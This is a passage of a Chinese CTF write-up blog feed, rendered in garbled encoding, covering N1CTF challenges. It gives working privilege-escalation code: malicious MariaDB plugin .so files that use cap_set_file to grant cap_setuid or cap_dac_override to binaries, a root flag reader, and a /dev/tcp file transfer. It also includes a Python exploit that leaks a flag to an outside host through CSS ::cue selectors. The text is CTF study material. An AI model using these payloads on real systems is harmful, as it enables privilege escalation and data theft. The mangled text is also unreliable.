style="text-align:center">å…è®¸ä¿®æ”¹æ–‡ä»¶çš„ IMMUTABLE å’Œ APPEND å±æ€§æ ‡å¿—</td></tr><tr><td style="text-align:center">CAPMACADMIN</td><td style="text-align:center">å…è®¸ MAC é…ç½®æˆ–çŠ¶æ€æ›´æ”¹</td></tr><tr><td style="text-align:center">CAPMACOVERRIDE</td><td style="text-align:center">å¿½ç•¥æ–‡ä»¶çš„ DAC è®¿é—®é™åˆ¶</td></tr><tr><td style="text-align:center">CAP_MKNOD</td><td style="text-align:center">å…è®¸ä½¿ç”¨ mknod() ç³»ç»Ÿè°ƒç”¨</td></tr><tr><td style="text-align:center">CAPNETADMIN</td><td style="text-align:center">å…è®¸æ‰§è¡Œç½‘ç»œç®¡ç†ä»»åŠ¡</td></tr><tr><td style="text-align:center">CAPNETBIND_SERVICE</td><td style="text-align:center">å…è®¸ç»‘å®šåˆ°å°äº 1024 çš„ç«¯å£</td></tr><tr><td style="text-align:center">CAPNETBROADCAST</td><td style="text-align:center">å…è®¸ç½‘ç»œå¹¿æ’­å’Œå¤šæ’­è®¿é—®</td></tr><tr><td style="text-align:center">CAPNETRAW</td><td style="text-align:center">å…è®¸ä½¿ç”¨åŸå§‹å¥—æ¥å­—</td></tr><tr><td style="text-align:center">CAP_SETGID</td><td style="text-align:center">å…è®¸æ”¹å˜è¿›ç¨‹çš„ GID</td></tr><tr><td style="text-align:center">CAP_SETFCAP</td><td style="text-align:center">å…è®¸ä¸ºæ–‡ä»¶è®¾ç½®ä»»æ„çš„ capabilities</td></tr><tr><td style="text-align:center">CAP_SETPCAP</td><td style="text-align:center">å‚è€ƒ capabilities man page</td></tr><tr><td style="text-align:center">CAP_SETUID</td><td style="text-align:center">å…è®¸æ”¹å˜è¿›ç¨‹çš„ UID</td></tr><tr><td style="text-align:center">CAPSYSADMIN</td><td style="text-align:center">å…è®¸æ‰§è¡Œç³»ç»Ÿç®¡ç†ä»»åŠ¡ï¼Œå¦‚åŠ è½½æˆ–å¸è½½æ–‡ä»¶ç³»ç»Ÿã€è®¾ç½®ç£ç›˜é…é¢ç­‰</td></tr><tr><td style="text-align:center">CAPSYSBOOT</td><td style="text-align:center">å…è®¸é‡æ–°å¯åŠ¨ç³»ç»Ÿ</td></tr><tr><td style="text-align:center">CAPSYSCHROOT</td><td style="text-align:center">å…è®¸ä½¿ç”¨ chroot() ç³»ç»Ÿè°ƒç”¨</td></tr><tr><td style="text-align:center">CAPSYSMODULE</td><td style="text-align:center">å…è®¸æ’å…¥å’Œåˆ é™¤å†…æ ¸æ¨¡å—</td></tr><tr><td style="text-align:center">CAPSYSNICE</td><td style="text-align:center">å…è®¸æå‡ä¼˜å…ˆçº§åŠè®¾ç½®å…¶ä»–è¿›ç¨‹çš„ä¼˜å…ˆçº§</td></tr><tr><td style="text-align:center">CAPSYSPACCT</td><td style="text-align:center">å…è®¸æ‰§è¡Œè¿›ç¨‹çš„ BSD å¼å®¡è®¡</td></tr><tr><td style="text-align:center">CAPSYSPTRACE</td><td style="text-align:center">å…è®¸è·Ÿè¸ªä»»ä½•è¿›ç¨‹</td></tr><tr><td style="text-align:center">CAPSYSRAWIO</td><td style="text-align:center">å…è®¸ç›´æ¥è®¿é—® /devportã€/dev/memã€/dev/kmem åŠåŸå§‹å—è®¾å¤‡</td></tr><tr><td style="text-align:center">CAPSYSRESOURCE</td><td style="text-align:center">å¿½ç•¥èµ„æºé™åˆ¶</td></tr><tr><td style="text-align:center">CAPSYSTIME</td><td style="text-align:center">å…è®¸æ”¹å˜ç³»ç»Ÿæ—¶é’Ÿ</td></tr><tr><td style="text-align:center">CAPSYSTTY_CONFIG</td><td style="text-align:center">å…è®¸é…ç½® TTY è®¾å¤‡</td></tr><tr><td style="text-align:center">CAP_SYSLOG</td><td style="text-align:center">å…è®¸ä½¿ç”¨ syslog() ç³»ç»Ÿè°ƒç”¨</td></tr><tr><td style="text-align:center">CAPWAKEALARM</td><td style="text-align:center">å…è®¸è§¦å‘ä¸€äº›èƒ½å”¤é†’ç³»ç»Ÿçš„ä¸œè¥¿(æ¯”å¦‚ CLOCKBOOTTIMEALARM è®¡æ—¶å™¨)</td></tr></tbody></table><p>è®¾ç½®ä¸åˆ é™¤Capabilities</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcap cap_sys_admin+ep /usr/sbin/python <span class="comment">#è®¾ç½®capabilitiesæƒé™</span></span><br><span class="line">setcap -r /usr/sbin/python <span class="comment">#ç§»é™¤capabilitiesæƒé™</span></span><br></pre></td></tr></table></figure><p>æŸ¥æ‰¾Capabilitiesçš„æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getcap -r / <span class="number">2</span>&gt;/dev/<span class="literal">null</span></span><br><span class="line">find / -exec getcap &#123;&#125; ; <span class="number">2</span>&gt;/dev/<span class="literal">null</span> </span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699446001202.png" alt="1699446001202"></p><p>è¿™é‡Œmaraidbæœ‰cap_setfcapçš„æƒé™,å…è®¸ä¸ºæ–‡ä»¶è®¾ç½®ä»»æ„çš„ capabilities.</p><h2 id="å…¶ä¸€"><span id="å…¶ä¸€"> å…¶ä¸€</span></h2><p>å†™ä¸ªreadflag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gcc readflag.c -o readflag</span></span><br><span class="line"><span class="keyword">int</span> <span class="title function_ invoke__">main</span>() &#123;</span><br><span class="line">    char *buffer[<span class="number">1024</span>];</span><br><span class="line">    <span class="title function_ invoke__">setuid</span>(<span class="number">0</span>);</span><br><span class="line">    FILE* f = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;/flag&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">fread</span>(buffer, <span class="number">1024</span>, <span class="number">1</span>, f);</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(f);</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸‡èƒ½çš„base64å†™ä¸€åˆ‡</p><p>å†å†™ä¸€ä¸ªè°ƒç”¨ <code>cap_set_file</code> ç»™ readflag æŒ‚ä¸Š cap_setuid=ep<br>ä¹‹åç”¨ mariadb åŠ è½½æ¶æ„ so, mariadb â€“plugin-dir=/mysql/plugin/ â€“default-auth=setcap</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/capability.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// setcap cap_setuid+ep readflag</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// /usr/bin/mariadb cap_setfcap=ep</span></span><br><span class="line"><span class="comment">// gcc -fPIC -shared setcap.c -o setcap.so -lcap</span></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span> ((__constructor__)) <span class="keyword">void</span> <span class="title function_ invoke__">test</span> (<span class="keyword">void</span>)&#123;</span><br><span class="line">    cap_t cap = <span class="title function_ invoke__">cap_from_text</span>(<span class="string">&quot;cap_setuid+ep&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">cap_set_file</span>(<span class="string">&quot;/mysql/plugin/readflag&quot;</span>, cap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li><p><code>cap_t cap = cap_from_text(&quot;cap_setuid+ep&quot;);</code>ï¼šè¿™è¡Œä»£ç ä½¿ç”¨<code>cap_from_text</code>å‡½æ•°åˆ›å»ºä¸€ä¸ªèƒ½åŠ›é›†ï¼ˆcapability setï¼‰ã€‚åœ¨Linuxä¸­ï¼Œèƒ½åŠ›é›†æ˜¯ä¸€ç§å®‰å…¨æœºåˆ¶ï¼Œç”¨äºç®¡ç†è¿›ç¨‹å¯¹ç³»ç»Ÿèµ„æºå’Œæ“ä½œçš„è®¿é—®æƒé™ã€‚<code>cap_setuid+ep</code>è¡¨ç¤ºå¯ç”¨&quot;è®¾ç½®ç”¨æˆ·æ ‡è¯†&quot;ï¼ˆ<code>cap_setuid</code>ï¼‰å’Œ&quot;æå‡ç‰¹æƒ&quot;ï¼ˆ<code>ep</code>ï¼Œæ„å‘³ç€æ•ˆæœæŒä¹…ï¼‰ï¼Œè¿™æ„å‘³ç€ç¨‹åºå°†å…·æœ‰æå‡æƒé™çš„èƒ½åŠ›.</p><p>äººè¨€:è·å–<code>cap_setuid</code>è¿™ç§cap,ç„¶åç»™readflagèµ‹ä¸Š</p></li><li><p><code>cap_set_file(&quot;/mysql/plugin/readflag&quot;, cap);</code>ï¼šç»™readflagä¸Šæƒé™</p><p>ç¼–è¯‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared setcap.c -o setcap.so -lcap</span><br></pre></td></tr></table></figure><p><code>-lcap</code> æ˜¯ç¼–è¯‘C/C++ç¨‹åºæ—¶ä¼ é€’ç»™ç¼–è¯‘å™¨çš„é€‰é¡¹ä¹‹ä¸€ï¼Œç”¨äºæŒ‡å®šé“¾æ¥åˆ° Linux èƒ½åŠ›åº“,ä¸€äº›å¸¸è§çš„èƒ½åŠ›åº“å‡½æ•°åŒ…æ‹¬ <code>cap_from_text</code> å’Œ <code>cap_set_file</code>åœ¨è¿™é‡Œé¢</p><p>rnm,ç¼–è¯‘ä¸å‡ºæ¥,æœ¬åœ°ç¼–è¯‘å§.æŠ¥é”™:fatal error: sys/capability.h</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install libcap-dev</span><br></pre></td></tr></table></figure><p>è§£å†³ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mariadb â€“-plugin-dir=/tmp â€“-<span class="keyword">default</span>-auth=cap &amp;</span><br></pre></td></tr></table></figure><h2 id="å…¶äºŒ"><span id="å…¶äºŒ"> å…¶äºŒ</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/capability.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">lshell</span>()&#123;</span><br><span class="line">    cap_t caps = <span class="title function_ invoke__">cap_from_text</span>(<span class="string">&quot;cap_dac_override=eip&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">cap_set_file</span>(<span class="string">&quot;/bin/cat&quot;</span>, caps);</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;setcap finished\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LOLITA</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="title function_ invoke__">LOLITA</span>()&#123;</span><br><span class="line">        <span class="title function_ invoke__">lshell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">LOLITA _mysql_client_plugin_declaration_;</span><br><span class="line"><span class="comment">//compile: g++ evil.c -shared -fPIC -o cap.so -lcap2</span></span><br><span class="line">```</span><br><span class="line">å°†ç¼–è¯‘å‡ºæ¥çš„æ–‡ä»¶ä¼ åˆ°é¶æœºï¼ˆdd &lt; /dev/tcp/ip/port &gt; cap.soï¼‰  </span><br><span class="line">åŠ è½½è¿™ä¸ªsoè®©/bin/catè·å–cap_dac_overrideï¼ˆå¿½ç•¥æ–‡ä»¶æƒé™ï¼‰çš„ç‰¹æƒ  </span><br><span class="line">```</span><br><span class="line">mariadb --plugin-dir=. --<span class="keyword">default</span>-auth=cap</span><br><span class="line">cat /flag</span><br><span class="line">```</span><br></pre></td></tr></table></figure><h2 id="åŠ«æŒphp"><span id="åŠ«æŒphp"> åŠ«æŒphp</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;netinet/in.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/socket.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;dlfcn.h&gt;</span></span><br><span class="line"><span class="comment">// #include &lt;sys/capability.h&gt;</span></span><br><span class="line"></span><br><span class="line">typedef <span class="keyword">void</span>* cap_t;</span><br><span class="line">typedef <span class="title function_ invoke__">cap_t</span> (*cap_from_text_t)(<span class="keyword">const</span> char *);</span><br><span class="line">typedef <span class="keyword">int</span> (*cap_set_file_t)(<span class="keyword">const</span> <span class="variable constant_">char</span> *, cap_t);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span>((constructor)) <span class="keyword">void</span> <span class="title function_ invoke__">init</span>(<span class="keyword">int</span> argc, char *argv[]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">printf</span>(<span class="string">&quot;cap.c: init()\n&quot;</span>);</span><br><span class="line">    <span class="keyword">void</span> *handle = <span class="title function_ invoke__">dlopen</span> (<span class="string">&quot;/lib/x86_64-linux-gnu/libcap.so.2&quot;</span>, RTLD_LAZY);</span><br><span class="line">    cap_from_text_t cap_from_text = (cap_from_text_t)<span class="title function_ invoke__">dlsym</span>(handle, <span class="string">&quot;cap_from_text&quot;</span>);</span><br><span class="line">    cap_set_file_t cap_set_file = (cap_set_file_t)<span class="title function_ invoke__">dlsym</span>(handle, <span class="string">&quot;cap_set_file&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">cap_set_file</span>(<span class="string">&quot;/usr/local/bin/php&quot;</span>, <span class="title function_ invoke__">cap_from_text</span>(<span class="string">&quot;cap_setuid+ep&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ›´åŠçš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/capability.h&gt;</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">_init</span>()</span><br><span class="line">&#123;</span><br><span class="line">    cap_t caps = <span class="title function_ invoke__">cap_init</span>();</span><br><span class="line">    <span class="keyword">if</span> (caps == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">perror</span>(<span class="string">&quot;cap_init&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    cap_value_t cap_list[<span class="number">4</span>];</span><br><span class="line">    <span class="comment">//cap_list[0] = CAP_SYS_ADMIN;</span></span><br><span class="line">    cap_list[<span class="number">0</span>] = CAP_SETFCAP;</span><br><span class="line">    cap_list[<span class="number">1</span>] = CAP_CHOWN;</span><br><span class="line">    cap_list[<span class="number">2</span>] = CAP_SETUID;</span><br><span class="line">    cap_list[<span class="number">3</span>] = CAP_SETGID;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">cap_set_flag</span>(caps, CAP_EFFECTIVE, <span class="number">4</span>, cap_list, CAP_SET) == -<span class="number">1</span> ||</span><br><span class="line">        <span class="title function_ invoke__">cap_set_flag</span>(caps, CAP_INHERITABLE, <span class="number">4</span>, cap_list, CAP_SET) == -<span class="number">1</span> ||</span><br><span class="line">        <span class="title function_ invoke__">cap_set_flag</span>(caps, CAP_PERMITTED, <span class="number">4</span>, cap_list, CAP_SET) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">perror</span>(<span class="string">&quot;cap_set_flag&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">cap_free</span>(caps);</span><br><span class="line">        <span class="keyword">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">char</span> *filename = <span class="string">&quot;/tmp/perl&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">cap_set_file</span>(filename, caps) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">perror</span>(<span class="string">&quot;cap_set_file&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">cap_free</span>(caps);</span><br><span class="line">        <span class="keyword">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="title function_ invoke__">cap_free</span>(caps);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699456844128.png" alt="1699456844128"></p><p>mdğŸ˜¡å…¶å®ƒå‡ å®¶çš„åå¼¹shellpayloadæœ‰é—®é¢˜,åå¼¹shelläº†ä»¥åå°±ä¸€ç›´è¿ä¸ä¸Šmariadbäº†,æœ€åè¿˜æ˜¯ç”¨äº†lolitaçš„expæ‰“,ä¸€éè¿‡,æœç„¶lolitaè¿˜æ˜¯çˆ±æˆ‘çš„ğŸ¥°ğŸ¥°ğŸ¥°.</p><p>è¿™ç§ç»ˆå‡ºçš„æ„Ÿè§‰è°æ‡‚å•Š,å¥½âˆšâ…§èˆ’æœå•Š,âˆšâ…§å¥½èˆ’æœå•Š.</p><h1 id="ytiruces"><span id="ytiruces"> ytiruces</span></h1><p>ğŸ‘´ä¸æƒ³å¤ç°,ç¯å¢ƒä¸å¥½æ,ğŸ‘´è´´ä¸ªexpåœ¨è¿™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import <span class="keyword">string</span></span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;https://ytiruces.ctfpunk.com/?content=%3Cp%3E%3Cstyle%3E#style#%3C/style%3E%3Cvideo%20controls%20playsinline%20autoplay%20muted%20loop%3E%3Csource%20src=%22https://n1s.ctf.hurrison.com/test.webm%22%3E%3Ctrack%20src=%22/flag?name=WEBVTT%250a00:00.000--%3E00:13.000%250a%3Cv%22%20default%3E&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;n1ctf&#123;I&#x27;</span></span><br><span class="line"></span><br><span class="line">style = <span class="string">&#x27;::cue(v[voice^=%22&#x27;</span> + flag + <span class="string">&#x27;#x#%22])%20&#123;%20background:%20url(https://n1.ctf.hurrison.com/?f=#x#);%20&#125;%0a&#x27;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">table = <span class="keyword">string</span>.ascii_letters + <span class="string">&#x27;&#123;&#x27;</span> + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x in table:</span><br><span class="line">    s += style.<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;#x#&#x27;</span>, x)</span><br><span class="line"></span><br><span class="line">payload = payload.<span class="title function_ invoke__">replace</span>(<span class="string">&#x27;#style#&#x27;</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>(payload)</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;119.28.143.13&#x27;</span></span><br><span class="line">port = <span class="number">32890</span></span><br><span class="line"></span><br><span class="line">s = socket.<span class="title function_ invoke__">socket</span>(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.<span class="title function_ invoke__">connect</span>((ip, port))</span><br><span class="line">d = s.<span class="title function_ invoke__">recv</span>(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">print</span>(d)</span><br><span class="line">s.<span class="title function_ invoke__">send</span>(payload.<span class="title function_ invoke__">encode</span>())</span><br></pre></td></tr></table></figure></li></ol><h1 id="ggbonds-gogs"><span id="ggbonds-gogs"> ggbondâ€™s gogs</span></h1><p>ğŸ‘´çœŸä¸æ˜¯æ‡’,æ²¡ç¯å¢ƒå¤ç°ä¸ªé’©å­,tmdå½“ğŸ‘´â­ğŸ˜¡å§.</p><h1 id="dockerdebug"><span id="dockerdebug"> dockerdebug</span></h1><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FROM openjdk:8-alpine</span></span><br><span class="line"><span class="keyword">FROM</span> adoptopenjdk/openjdk11</span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> SimpleAPI-1.0-SNAPSHOT.jar /tmp/web.jar</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag /flag</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> start.sh /start.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> /start.sh </span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8877</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">3345</span></span><br></pre></td></tr></table></figure><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">touch /tmp/app.log</span><br><span class="line">chmod <span class="number">666</span> /tmp/app.log</span><br><span class="line"></span><br><span class="line">nohup java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:<span class="number">3345</span> -jar /tmp/web.jar &gt;/tmp/app.log</span><br></pre></td></tr></table></figure><p><img src="/2023/12/01/N1CTF-%E5%A4%8D%E7%8E%B0/1699318954586.png" alt="1699318954586"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8877:8877  -p 63342:63342 remote_debug</span><br></pre></td></tr></table></figure><p>è¿è¡Œè¿œç¨‹è¿æ¥debugä¸“ç”¨çš„ç«¯å£</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://1llustrious.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>DAS0RAYSXCBCTF</title>
    <link href="https://1llustrious.github.io/2023/11/30/DAS0RAYSXCBCTF/"/>
    <id>https://1llustrious.github.io/2023/11/30/DAS0RAYSXCBCTF/</id>
    <published>2023-11-30T08:12:36.000Z</published>
    <updated>2023-11-30T13:36:00.110Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><!-- toc --><ul><li><a href="#das0raysxcbctf">DAS0RAYSxCBCTF</a></li><li><a href="#%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2">å†™åœ¨å‰é¢</a></li><li><a href="#yet-another-box">yet another box</a><ul><li><a href="#stack-trace-api">Stack trace API</a></li><li><a href="#shadow-realm-api">Shadow-Realm-API</a></li><li><a href="#dynamic-import%E6%96%B9%E6%A1%88">dynamic importæ–¹æ¡ˆ</a></li><li><a href="#exp">exp</a></li></ul></li><li><a href="#nps">nps</a><ul><li><a href="#%E5%BC%80%E6%89%93">å¼€æ‰“ğŸ˜“</a></li><li><a href="#remote%E5%B9%B2">remoteå¹²ğŸ¤ª</a><ul><li><a href="#%E5%BF%86%E6%82%9F%E8%BF%99%E5%B0%B1%E6%98%AFxss%E7%9A%84%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%88%9B%E9%80%A0">å¿†!æ‚Ÿ!è¿™å°±æ˜¯xssçš„æœºå™¨äººåˆ›é€ </a></li><li><a href="#exp-1">exp</a></li></ul></li></ul></li><li><a href="#deserializeupload">Deserialize?Upload!</a><ul><li><a href="#actuator">actuatorğŸ˜«</a></li><li><a href="#%E9%A2%98%E7%9B%AE%E5%AE%9E%E8%B7%B5">é¢˜ç›®å®è·µğŸ˜“ğŸ˜¡</a></li><li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90">ååºåˆ—åŒ–åˆ†æğŸ˜›</a></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%84%E5%90%88%E6%8B%B3">æ–‡ä»¶ä¸Šä¼ +ååºåˆ—åŒ–ç»„åˆæ‹³ğŸ˜¤</a></li></ul></li><li><a href="#dasctfxcbctf_2023_bypassjava">DASCTFXCBCTF_2023_bypassJava</a><ul><li><a 